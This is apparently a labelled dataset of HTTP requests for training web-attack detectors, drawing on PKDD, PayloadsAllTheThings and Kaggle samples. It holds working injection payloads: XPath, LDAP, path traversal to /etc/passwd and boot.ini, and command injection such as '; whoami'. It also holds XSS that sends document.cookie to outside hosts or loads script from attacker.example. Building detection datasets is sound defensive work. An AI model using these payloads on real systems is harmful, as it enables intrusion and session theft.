attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
XPath Injection,medium,4.0,malicious,"POST /sre12cinid/nmax4NG/7Yi0Mxowv1zTS/qxu.krd-2usrL4B0/d8818tEByrbDXo/easrlnl/iVyWGKb-vsSC/lW.sVkwP.rz-NMQ.cgi? HTTP/1.0
Content-Length: 202
Content-Language: hcetf9s
Content-Encoding: compress
Content-Location: http://gfhuej.fr/utlh/oeotere/naoa/aaEsh/rebhos1.dll
Content-MD5: bllrcmVSbDJvYWxlaDJpcw==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 29 Mar 10 10:09:36 CET
Last-Modified: Fri, 25 Jan 08 07:19:59 CET
Host: 178.169.196.75
Connection: close
Accept: image/jpeg
Accept-Charset: *;q=0.3
Accept-Encoding: 
Accept-Language: vecfNo-eefhits;q=0.5
Cache-Control: no-transform
Client-ip: 140.188.172.60
Cookie: ekciECSecopyDY=14955;srUleodueoo=55;tpSeenetcliG=ps';airaaocitpWtwn=twnse4;ntatGv=eWOcJ;JdivXVuRA=92921
Cookie2: $Version=""590""
Date: Fri, 26 Mar 04 12:31:51 CET
ETag: ""iRPx-vhsrn5IOB4F@6ra""
Expect: oiaydiik=Cesre;ani7=heeoad
From: i1istd@23tm.net
If-Modified-Since: Sat, 18 Feb 06 11:23:30 UTC
If-Unmodified-Since: Mon, 05 Jan 04 13:43:02 CET
If-Match: *
If-None-Match: *
If-Range: Sat, 01 Dec 07 01:52:26 GMT
Max-Forwards: 743
MIME-Version: 7.4
Pragma: no-cache
Proxy-Authorization: Basic bXNlczlyaDpudHNo
Authorization: Basic SXR2dTp1bkljZGE=
Range: 569156-2482
Referer: http://ipuf.gov/eTaHsh/s4ni0cnh/scedawsd/AtnY.tiff
TE: gzip,trailers,trailers
Trailer: Expect
User-Agent: aOodhfe/1.1
UA-Disp: 527,267,32
UA-Color: color8
UA-Pixels: 640x9904
Via: 5.2 96.130.108.219, 4.0 230.93.196.168:3142, fT9/2.1 www.tuyssr.htm
Transfer-Encoding: gzip
Upgrade: 4mtfwe/7.8, Nuhsbd/2.0, ozoe1/6.1, oePeo/8.5, ats/0.5
Warning: 956 www.8Oqk.shtml:3 ""dhfeiV6ltr"" 
X-Forwarded-For: 243.139.91.251
X-Serial-Number: 3185085450816900238
----: ----------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

N6O4T@L4Ha=uae3b&access_logHWp0aHfVlocationJQ=b-A-Nu2b&ScatUhO=yxil&S20M47=riae'    or  1<     bern/6aanr/atpgn/child::text()[position()=638]   or     'd0aoab2f' =  '",48695,1927,xml_test-48695,pkdd,
XPath Injection,medium,5.5,malicious,"GET /1NQ/PjMqYb8yWwV/etDV/oEd2/JrnhgiWtytMozaw/aAbfIeN4/lT7o-u.html?bsttchrl=%29+tperlr&Upassthrujrdropfkp=cfnbi2&ahcuayu=90712&6e1j6hofasctnt=bafhcebsr9e&rIraHpaEsou=72723985&.JI0WRwKN9=olibten&yOsSwtnc=001&cwi5upiLo1ee=3690&eAJb5Q7QjautoexecU0=t4jXHQv4&nhitoanhoinadri=921&qxdQuq=ngc10ia8ahr0i4 HTTP/1.0
Host: www.tsUDsw.org
Connection: keep-alive
Accept: video/*;q=0.6, image/*;q=0.7, audio/basic;q=0.2
Accept-Charset: iso-8859-8;q=0.4, us-ascii, x-mac-chinesetrad;q=0.3, utf-7
Accept-Encoding: *;q=0.9
Accept-Language: nb8xen-aEhnH;q=0.1, erstvt-m6Tf;q=0.3
Cache-Control: no-cache
Cookie: efeioieuo9=0t'     or  (i  <    count(eej/child::text())     and   j     < count(h7/child::comment())     and     k  < count(imsr/child::*)   )    or '9Reshrat'    =   ' ar'  or
Date: Wed, 04 Apr 07 02:07:05 GMT
Expect: epenp
If-Modified-Since: Mon, 18 Jun 07 18:16:31 UTC
If-Match: ""2qxLlEy.INXCoLaT""
If-None-Match: *
If-Range: *
Max-Forwards: 8920
Pragma: no-cache
Authorization: Basic dDBrcGh0REI6dW10cnNhYg==
Referer: http://www.oggoI.org/tteeNf/cbjoiii/ahE4imd/eure.mdb
User-Agent: Mozilla/3.8 (compatible; Konqueror/7.6; Win98; gbhubhrhem; m4oJ; hlNLohee)
Via: rsa/1.5 www.arnY.png, Tbel/7.7 120.136.94.200:036, 4.3 www.eegef.png",48472,1248,xml_test-48472,pkdd,
LDAP Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

file=(&(sn=administrator)(password=MB*)) : KO&id=1205",,215,patt-ldap-injection-0205,PayloadsAllTheThings,(&(sn=administrator)(password=MB*)) : KO
XSS,medium,,malicious,"POST /search HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close

redirect=""><script src=//attacker.example></script>&id=2224",,228,patt-xss-1224,PayloadsAllTheThings,"""><script src=//attacker.example></script>"
LDAP Injection,medium,4.0,malicious,"PUT /n-DoU.rsQuA/sr4M/04oQL5j.TN0hgmB9/osln.css? HTTP/1.0
Content-Length: 111
Content-Language: mtrREf,as,daenx
Content-Encoding: deflate
Content-Location: /atsx/77cg/cOod/3srsl.gif
Content-MD5: dDRldGt1MWx0b3NrZWwybw==
Content-Type: application/x-www-form-urlencoded
Expires: Wed, 17 Nov 04 01:47:28 CET
Last-Modified: Sat, 22 May 04 01:44:54 GMT
Host: 19.208.108.249:80
Connection: close
Accept: audio/basic;q=0.0, application/*;q=0.4
Accept-Charset: *
Accept-Encoding: gzip;q=0.3, gzip;q=0.0, identity;q=0.9, deflate, deflate;q=0.6
Accept-Language: l-u, jssdI9et-tts
Cache-Control: max-age=574
Client-ip: 15.45.8.54
Cookie: emlriiaI1Te=s1keGF1H;rtaU1mer=)   (|(displayName=had*)  (name   =had*)(   mail=had*);srhmsdaeLn6e=hs'oat%ez7o
Cookie2: $Version=""4""
Date: Wed, 07 May 08 10:12:29 UTC
ETag: W/""g73ApvtYuS1Ny5Wm17@e""
Expect: 100-continue
If-Unmodified-Since: Thu, 03 Mar 05 07:58:28 UTC
If-Match: ""sM4GRT4D.Rwfhn1I""
If-None-Match: *
If-Range: Sun, 11 Nov 07 07:17:14 GMT
Max-Forwards: 44
Pragma: no-cache
Authorization: Basic aGllazpmaGFz
Range: 5646-401977,1107-6680,-60
Referer: /cDmtie/yson7/etnlb/tdd8.dll
TE: chunked;q=0.9
Trailer: Expect
User-Agent: Mozilla/1.3 (Machintosh; U; PPC Mac OS X 3.1; no-em; rv:9.0.6) Gecko/49770993
UA-OS: Windows 98
UA-Pixels: 455x2330
Transfer-Encoding: compress
Upgrade: 9kB/3.7, xeb/2.9, hIe/8.5
Warning: 553 253.145.241.182 ""ehdterdEEttm"" 
----: ------------------------------------------

Z7ienniew4ha=0031350&di=m4hed41nA3t1e0Nbo&utdEu=ocnMnm&ire=361&zl=MwesnhOohzn&g9iPnl5nuz=bw~http+stby&ai=68",39083,1585,xml_test-39083,pkdd,
Path Traversal,medium,,malicious,"POST /api/items HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: close

redirect=..%uF025..%uF025..%uF025..%uF025/etc/passwd&id=2203",,223,patt-path-traversal-1203,PayloadsAllTheThings,..%uF025..%uF025..%uF025..%uF025/etc/passwd
XSS,medium,4.0,malicious,"PUT /8uieyVtatybe7ih.htm? HTTP/1.1
Content-Length: 249
Content-Language: 5,r5idQqbi,Qdcn
Content-Encoding: deflate
Content-Location: http://www.atnn0rp.de/v5hXa/sato0Nr/s6nvti.php4
Content-MD5: ZnV3ZHpSZmUxdnZ1UmRjZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Sat, 12 Dec 09 07:00:12 CET
Last-Modified: Sun, 03 May 09 22:25:28 CET
Host: 31.139.126.86
Connection: sttefl5i
Accept: */*
Accept-Charset: gb2312, utf-8;q=0.8, ks_c_5601-1987, x-mac-cyrillic;q=0.5, iso-2022-jp
Accept-Encoding: 
Accept-Language: e-eil, vFoeod-osas, oe8Hnyef-ay;q=0.2
Cache-Control: min-fresh=14658
Client-ip: 202.152.82.23
Cookie: ielSyYRCseeeal=ropt
Cookie2: $Version=""4""
Date: Sun, 18 Apr 10 19:02:40 CET
ETag: ""uvWwqLBwApGZcIhP""
Expect: feazi6
From: dyenT@gpt6glsG.cz
If-Modified-Since: Thu, 22 May 08 06:18:58 UTC
If-Unmodified-Since: Mon, 03 May 10 03:41:21 CET
If-Match: *
If-None-Match: *
If-Range: Tue, 20 Oct 09 09:58:38 GMT
Max-Forwards: 3218
MIME-Version: 0.8
Pragma: no-cache
Proxy-Authorization: o1svi Elj40=bhoesO1
Authorization: 8eeq bSihE=Gspcil
Range: 462-
Referer: /lafsei.dll
TE: gzip,gzip;q=0.4
User-Agent: Mozilla/4.8 (X11; U; SunOS sun4u 4.9; bt-eh; rv:9.3.8) Gecko/02762112
UA-Color: color32
UA-Pixels: 1199x1516
Via: FTP/2.3 www.Edityfik.js, Ar9s/1.7 90.180.35.219, 7.8 www.a4Ieoorn.jpg
Transfer-Encoding: p9loe; tn6hn=xuRtltbn
Warning: 061 205.79.84.252 ""trdaeY"" ""Tue, 09 Nov 04 20:27:34 CET""
X-Forwarded-For: 183.74.153.68
X-Serial-Number: 105971197314660
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

m7tt7dhhitow=yh2vW&enetyi8jlsct9e=7Ujnat5di ab9tt&9noaOaonridsm=<meta     http-equiv  ="" refresh     ""  content  = ""  0;url=javascript:    [window.open('http://4.133.32.242/as.pl'+document.cookie);]  "" >",46769,1768,xml_test-46769,pkdd,
Path Traversal,medium,4.0,malicious,"GET /.nsf/../winnt/win.ini? HTTP/1.0
Host: www.tunxweee.gov
Connection: Hnse
Accept: */*;q=0.3
Accept-Charset: *
Accept-Encoding: 
Accept-Language: *
Cache-Control: no-store
Client-ip: 76.158.230.163
Cookie2: $Version=""3""
Date: Thu, 24 May 07 03:43:55 GMT
Expect: 100-continue
If-Modified-Since: Fri, 18 Jun 04 21:07:23 UTC
If-None-Match: *
Max-Forwards: 691
Pragma: eehlUt6=3
Authorization: Basic ZGRhaGVlbTo4c3RlaA==
Referer: http://ort0pe.com/qaeUnr0/t340xe/ucmtnaec/nd0n/whz2stt.mspx
TE: trailers,trailers,gzip
Trailer: Accept-Language
User-Agent: TebtedpdlaEtgtbsw
Via: 1.7 www.sqetltr.jpg, 5.3 www.borc.jpg:33",36205,636,xml_test-36205,pkdd,
XPath Injection,hard,1.0,malicious,"GET /jDub3tghef/hWdpVvU3_uX2U5tO@we5/2bs3Daa/AzVuRsjmSpdttnpeeoo4/OwDu6tbo/mI8KSy-r_2eO8DUSSnHk/p1JnhAPht3VrO@BDF/6uebuGitisrldAa/tAaeatntawgjialg/ufparpda3M/z-4-mD3oRj6ode_ApvgL.aspx? HTTP/1.1
Host: www.eshiTlhaee.st
Connection: Mnecta
Accept: audio/basic;q=0.6
Accept-Encoding: identity, deflate;q=0.3, gzip;q=0.0, gzip
Accept-Language: *
Client-ip: 148.138.198.57
Cookie: tr4sljsspe2dvc=Nsd'm;hc=re;oeeZpoyqashjeit=ai8sadjfttodrn1i;2ineoaicseu6a=aufzM;iosM=149 or    s/fertcD/aieb/child::node()[position()=56]   or     9=;qi=exbw5leie51ein
Date: Sat, 18 Apr 09 15:55:36 CET
Expect: 100-continue
If-Modified-Since: Sat, 15 Aug 09 16:40:53 CET
If-Unmodified-Since: Thu, 23 Feb 06 24:40:58 CET
If-Range: Fri, 28 Jul 06 12:16:10 GMT
Max-Forwards: 1
Referer: http://te8nulsa.org/5tHoeai/uws9de4/eh5r.gz
User-Agent: uEBgFU5 http://www.Ltosd.org",35500,856,xml_test-35500,pkdd,
LDAP Injection,medium,,malicious,"POST /download HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close

redirect=(&(sn=administrator)(password=MY*)) : OK&id=1206",,215,patt-ldap-injection-0206,PayloadsAllTheThings,(&(sn=administrator)(password=MY*)) : OK
Path Traversal,medium,,malicious,"POST /login HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Connection: close

redirect=/..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini&id=2091",,226,patt-path-traversal-1091,PayloadsAllTheThings,/..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
Command Injection,medium,,malicious,"GET /exec?target=&& uname -a HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Accept: */*
Connection: close

",,0,kaggle-cmdi-033,KaggleWebPayloads,&& uname -a
SQLi,medium,3.0,malicious,"GET /dduceninhhlll/havingXkYusWhxQLVIm/0z/seMXckOI5int.hsOS/gt3fdrsm/munA3a-PFf/AnystsoselaL/tyPwoEPZeXmYxcM3U@wr/r-6uJqO/nn85Ef7ahgfdn.css?8a5eE=or+++++0%3C%3E%28select++++count%28*%29+++++from+++++etk%29&osadktlelI7leep=bwgetebeetltm0aEA%5C8p%28&1rIeeohLi=hllt34caazer7ib&olkone2b8th=eatekTne8t&i4ia=l%40j&klnna3npuist=372648&cswchDcolmct=mgorlemeu%3C&lyt=aHeygq.I HTTP/1.0
Host: 44.20.162.199
Connection: close
Accept: audio/basic, image/gif;q=0.2
Accept-Charset: hz-gb-2312;q=0.8, iso-8859-3;q=0.9, x-mac-korean, ks_c_5601-1987, cp-950
Accept-Encoding: gzip
Accept-Language: ipne-dexie3lt
Cache-Control: eeoaC=qeyh
Client-ip: 135.182.107.81
Cookie: csTJees=ms nandfT$passwdoet rIhE;Ee0hoe=h0UiFFJ1;ia5tl=oA1vcTLjQ6Vr
Cookie2: $Version=""095""
Date: Tue, 14 Dec 04 07:57:31 GMT
ETag: W/""17F1n2q6q2So7mxf""
Expect: qssn
From: 8eae@aimsslc7.net
If-Modified-Since: Tue, 20 May 08 24:32:21 UTC
If-Unmodified-Since: Sun, 09 Aug 09 19:25:15 UTC
If-Match: ""79N6weC8TiNHylJR""
If-None-Match: ""Ov5nFjambTHI4234Ir""
If-Range: Sun, 20 Apr 08 14:07:00 UTC
Max-Forwards: 69
MIME-Version: 4.6
Pragma: no-cache
Proxy-Authorization: NTLM c2NTYTJ1bDV3emVlZXlUZWV0ZHJhZXR5ZHJiN2dlaWNvY2ZTaWhlZW9ybWNq
Authorization: geSL smaxehu=eLdtQ
Range: -568889,-588214
Referer: http://4oeshn6t.be/ieeo/sarxahco/ac6ilu/grsa8r.tar.gz
TE: gzip,trailers
Trailer: Trailer
User-Agent: Mozilla/7.1 (compatible; aete; WinNT; aa4prL)
UA-CPU: 68000
UA-Disp: 695,8049,32
UA-OS: FreeBSD
UA-Color: color16
UA-Pixels: 5338x078
Via: FTP/6.4 www.ieIl.gif:705, aeae/7.0 www.tss8og.css
Transfer-Encoding: wtaZya; iEiNota=sh2ite
Upgrade: i7iya/1.9, iT3ylo/7.2
Warning: 451 www.eiet.jpeg ""i5xleaeaz"" 
X-Forwarded-For: 116.157.87.80
X-Serial-Number: 401722
----: --------------------------
~~~~~: ~~~~~~~~~~~",42296,1798,xml_test-42296,pkdd,
Path Traversal,hard,0.5,malicious,"POST /-2T_/Gr8nrvMstyle/fphVooAqjlQAt/o-oT8amMEeIH3Oqc0DF/cZKut0TyjWTolhOaE/ulTrienothnv/passthruB8xeYHA/a6nie/AynNa_RDLxchild/mruaareOsayl/i@e/9OE_T58STZZz7V.php3? HTTP/1.0
Content-Length: 113
Content-Language: HrdF
Content-Encoding: gzip
Content-Location: /foeNlt/onLNs.gif
Content-MD5: OGhFZTJzSUlubmVhZG9laQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 20 Oct 06 03:54:16 UTC
Last-Modified: Fri, 17 Sep 04 14:35:13 GMT
Host: www.sr0r.de
Connection: close
Accept: text/xml;q=0.5
Accept-Charset: *
Accept-Encoding: 
Accept-Language: w-oho;q=0.4
Cookie: tqrgo=../../../rena/admin.txt;mlflRee=Cesp/mad6H7l
Date: Wed, 11 Mar 09 14:17:35 UTC
ETag: W/""vZ3Q66kuOTN3JtgQ8uk""
Expect: ania
If-Modified-Since: Fri, 03 Nov 06 01:42:39 CET
If-Unmodified-Since: Fri, 21 Jul 06 11:36:39 GMT
If-Match: *
If-None-Match: ""fp.-CylQFrI5ng60vA""
If-Range: Tue, 20 Oct 09 11:27:09 GMT
Max-Forwards: 931
MIME-Version: 7.0
Pragma: no-cache
Proxy-Authorization: JnfSo p4thta=hsnlta
Authorization: Digest opaque=""csfs""
Referer: /kxhsv9.mp3
TE: trailers,trailers,deflate
User-Agent: 4nhs3flcp6dlu7te
UA-Color: color16
Via: FTP/5.9 137.147.108.200, 2.1 11.75.12.204, 7.1 www.eitm.shtml
Upgrade: ado/3.2, itnor/6.3

de5aw2lyeiNuw=815&eAd7eld=efgm.rR&nteethc=gti&csslc06n0eIlqie=ntEopenwwIAeag0d5a| ae&3eOt=38&thryrzasq=06824476",45033,1355,xml_test-45033,pkdd,
XSS,medium,,malicious,"POST /search HTTP/1.1
Host: demo.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Connection: close

comment=ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF&id=2328",,227,patt-xss-1328,PayloadsAllTheThings,"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF"
,hard,-2.0,benign,"POST /8AbQpZaRvZqpQ/RCcl7/mtAFuw11/fSx8GfrqwYnJ1@Wtj_f6/bTn7U/8Y/-Tpa9acceptShavingDb7.Xx.htm? HTTP/1.1
Content-Length: 161
Content-Language: c8necgrn
Content-Encoding: deflate
Content-Location: /e7eceshe/dsEdteAr/rn3oLSl/as6a/e1atyv.pdf
Content-MD5: TmV0eWVvZmVhcmdsczltUw==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 05 Dec 08 06:27:51 UTC
Last-Modified: Tue, 17 Jul 07 08:03:09 GMT
Host: www.oTiA.st
Connection: keep-alive
Accept: */*;q=0.2
Accept-Charset: iso-8859-8-i;q=0.5, iso-8859-3, iso-8859-3;q=0.0, x-mac-hebrew
Accept-Encoding: deflate;q=0.8, compress;q=0.0, gzip
Accept-Language: ol6mH-eWvd;q=0.3, yeotefe-weytShs;q=0.4, iEhsln-v
Cache-Control: max-age=2566
Client-ip: 194.231.198.230
Cookie: 9eevin=r;Pl4tS_GU2Vn=ekpthshutdownol;je=59250;eevfReeeOfy=IHhqe;ontsndtat=;bOfrom0tenh
Cookie2: $Version=""1""
Date: Tue, 26 Dec 06 19:06:56 GMT
ETag: ""HTeaV3unk6Zkq-7EKBuw""
Expect: 100-continue
From: EinolCd@e1annaob6.gov
If-Modified-Since: Tue, 27 Apr 04 15:38:24 UTC
If-Unmodified-Since: Sat, 08 Nov 08 05:43:11 UTC
If-Match: *
If-None-Match: *
If-Range: Wed, 03 Oct 07 12:19:55 CET
Max-Forwards: 38
MIME-Version: 2.5
Pragma: no-cache
Proxy-Authorization: Basic ZWlnck1oZXQ6eXNVbnZyZQ==
Authorization: Digest cnonce=""Ets6nc""
Range: -69,-4,172-
Referer: /ogwseat.jsp
TE: trailers,trailers
Trailer: Accept-Language
User-Agent: igbhn (sBqcPs-v)
UA-CPU: MIPS
UA-Disp: 6397,158,8
UA-OS: FreeBSD
UA-Color: color16
UA-Pixels: 2101x785
Via: FTP/0.2 225.124.59.85, 7.8 www.aqlfs.html, FTP/1.2 www.2cn9te.css
Transfer-Encoding: ihss
Upgrade: tqo/8.5, hd7t/7.1
Warning: 024 183.247.152.106:01 ""caee7oieenaqu19hTsdR"" ""Wed, 15 Apr 09 07:52:38 CET""
X-Forwarded-For: 113.32.119.185
X-Serial-Number: 93235551323019151899
----: -------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PdWMk-.=61902&s9Ete8e7=40&gnthurLe82r9jeg=0oleh nx&oRskn1yspjn=4&9flo=cB8wa|1efel6&i8rlc=58&coEe=crtyw59&bemiQwglhgdFiq=anha/ojimo insert154nx&uaDhtDec=k2i3X",33363,2036,xml_test-33363,pkdd,
Command Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close

comment='; whoami&id=1937",,192,patt-command-injection-0937,PayloadsAllTheThings,'; whoami
XSS,medium,3.5,malicious,"POST /id@WJRUjIk/libwiTA0N/iiilv.tiff? HTTP/1.1
Content-Length: 152
Content-Language: ETOxp9,pe
Content-Encoding: identity
Content-Location: /3son.ace
Content-MD5: bmFzeW5sbG1oamFsMU1uRQ==
Content-Type: application/x-www-form-urlencoded
Expires: Fri, 16 Dec 05 14:14:36 CET
Last-Modified: Fri, 16 Jan 04 23:42:55 UTC
Host: www.miawnhc.gov
Connection: keep-alive
Accept: */*
Accept-Charset: iso-10646-ucs-2, euc-tw;q=0.2, x-mac-chinesetrad;q=0.1
Accept-Encoding: deflate;q=0.1
Accept-Language: ea-6ca7n;q=0.1, 6Lcheuh-iYt, pnireeam-tr
Cache-Control: no-transform
Client-ip: 118.134.185.197
Cookie2: $Version=""5""
Date: Sat, 06 Oct 07 08:30:04 CET
ETag: W/""DTPVKZ_U4E2_B6CmD""
Expect: iQbird
If-Modified-Since: Mon, 19 Jun 06 14:03:12 UTC
If-Unmodified-Since: Sat, 09 Apr 05 08:35:09 UTC
If-Match: *
If-None-Match: *
If-Range: Wed, 03 Sep 08 18:00:42 GMT
Max-Forwards: 62
MIME-Version: 8.6
Pragma: 8otnf='okhtoy'
Authorization: Basic YUJlaWV1OlNwYWw=
Range: 9-78819
Referer: http://www.s4axgme.de/eieoTh/eLouu2en/egtsu7h/esmaea.mdb
TE: deflate,gzip,trailers
User-Agent: <img src   =  ""    tindatneta ""onmouseover=   ""    [document.location.replace   ('http://www.ilsiorar.com/cgi-bin/veniatie.cgi'+document.cookie);]   "" >
UA-Pixels: 2557x0166
Via: 5.6 46.24.10.113
Transfer-Encoding: identity
Warning: 893 78.20.40.155 ""h9rlthiE7eebet5grc"" 
X-Forwarded-For: 16.22.84.83
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Jeuwp-Vo-6=tn0l2as8hn&7871=2958599&@Mpfv9stylevAQ=ileut3opositiondlhdatq/&Hurhinxeo=bInatitettistdi&ml4PLln2=ozUAV&tzisaipauo=3611540&atPtarwo=1085478",48208,1599,xml_test-48208,pkdd,
Command Injection,medium,,malicious,"POST /cgi-bin/test HTTP/1.1
Host: demo.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close

cmd=; sleep 15&trace=1015",,0,kaggle-cmdi-015,KaggleWebPayloads,; sleep 15
XSS,medium,4.0,malicious,"POST /3PpDCvBrVNPubi/1S/4vdwt/az/aiqGSI3kRMd/i77dgwT3S.html? HTTP/1.1
Content-Length: 233
Content-Language: otahrxmt,o
Content-Encoding: gzip
Content-Location: http://wmbetsao.ch/srra/cpeeows/imtft/tNh9av/etnI9.jpg
Content-MD5: N2NwZThlZW54aWhzVHJpeA==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 20 Jul 04 10:02:06 UTC
Last-Modified: Mon, 31 Jan 05 16:26:38 GMT
Host: www.0nre.be:9199
Connection: close
Accept: */*;q=0.4
Accept-Charset: utf-7, iso-2022-jp;q=0.1, cp-932;q=0.6, euc-kr, windows-1257
Accept-Encoding: 
Accept-Language: *;q=0.7
Cache-Control: no-transform
Client-ip: 202.152.82.23
Cookie: ielSyYRCseeeal=ropt
Cookie2: $Version=""4""
Date: Fri, 10 Sep 04 24:38:07 UTC
ETag: ""uvWwqLBwApGZcIhP""
Expect: feazi6
From: dyenT@gpt6glsG.cz
If-Modified-Since: Thu, 22 May 08 06:18:58 UTC
If-Unmodified-Since: Mon, 03 May 10 03:41:21 CET
If-Match: *
If-None-Match: *
If-Range: Tue, 20 Oct 09 09:58:38 GMT
Max-Forwards: 4
MIME-Version: 5.2
Pragma: no-cache
Proxy-Authorization: o1svi Elj40=bhoesO1
Authorization: 8eeq bSihE=Gspcil
Range: -03,-42983
Referer: /dffegneK.mp3
TE: deflate
User-Agent: Mozilla/7.6 (compatible; MSIE 6.9; Linux i586; Phdlnn; 385nyn; zuGer7r6)
UA-Color: color32
UA-Pixels: 1199x1516
Via: FTP/2.3 www.Edityfik.js, Ar9s/1.7 90.180.35.219, 7.8 www.a4Ieoorn.jpg
Transfer-Encoding: deflate
Warning: 061 205.79.84.252 ""trdaeY"" ""Tue, 09 Nov 04 20:27:34 CET""
X-Forwarded-For: 183.74.153.68
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

52Kall4K=<img  src    =""livescript:[document.location.replace('http://www.ch.com/cgi-bin/ri.cgi'+document.cookie);] ""   >&E9m=tRIMH.Omt&nbrkhtuprttaMzd=select4&DHncjNgXlink=oz iby(Hnetcat8e|h",46767,1705,xml_test-46767,pkdd,
XSS,medium,,malicious,"POST /login HTTP/1.1
Host: app.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Connection: close

comment=""`'><script>\xE2\x80\x85javascript:alert(1)</script>&id=2290",,231,patt-xss-1290,PayloadsAllTheThings,"""`'><script>\xE2\x80\x85javascript:alert(1)</script>"
